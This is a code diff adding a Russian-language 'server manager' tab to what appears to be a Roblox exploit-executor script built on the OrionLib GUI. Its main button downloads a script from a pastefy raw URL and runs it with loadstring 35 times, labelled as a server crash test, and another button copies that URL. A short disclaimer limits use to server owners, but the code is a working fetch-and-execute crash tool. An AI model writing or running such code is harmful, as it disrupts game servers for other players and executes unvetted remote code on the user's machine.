@@ -4563,6 +4563,64 @@ do
 end
 
 -- ============================================================================
+-- ブロック31.5 [RU]: Менеджер сервера（ロシア語版）
+-- ============================================================================
+do
+    local Window = _G.Window
+    local OrionLib = _G.OrionLib
+
+    local CrashTab = Window:MakeTab({
+        Name = "Менеджер сервера",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    CrashTab:AddParagraph(
+        "⚠️ Запрещено злоупотребление",
+        "Функция для тестирования владельцами сервера.\n" ..
+        "Не запускайте на чужих серверах."
+    )
+
+    CrashTab:AddSection({ Name = "Тестовый запуск" })
+
+    CrashTab:AddButton({
+        Name = "⚡ Тест краша сервера (35 раз подряд)",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "Тест краша сервера",
+                Content = "Начинаем 35 последовательных запусков...",
+                Time = 3
+            })
+            local success, err = pcall(function()
+                local url = "https://pastefy.app/sPciZuXM/raw"
+                local scriptContent = game:HttpGet(url)
+                for i = 1, 35 do
+                    loadstring(scriptContent)()
+                    task.wait(0.1)
+                end
+            end)
+            if success then
+                PlayActionSound()
+                OrionLib:MakeNotification({ Name = "Готово", Content = "35 запусков выполнено", Time = 5 })
+            else
+                PlayErrorSound()
+                OrionLib:MakeNotification({ Name = "Ошибка", Content = "Произошла ошибка при выполнении: " .. tostring(err), Time = 5 })
+            end
+        end
+    })
+
+    CrashTab:AddButton({
+        Name = "📋 Копировать URL",
+        Callback = function()
+            PlayActionSound()
+            setclipboard("https://pastefy.app/sPciZuXM/raw")
+            OrionLib:MakeNotification({ Name = "URL скопирован", Content = "Скопировано в буфер обмена", Time = 3 })
+        end
+    })
+end
+
+-- ============================================================================
 -- Блок 32: Вкладка захвата поезда
 -- ============================================================================
 do
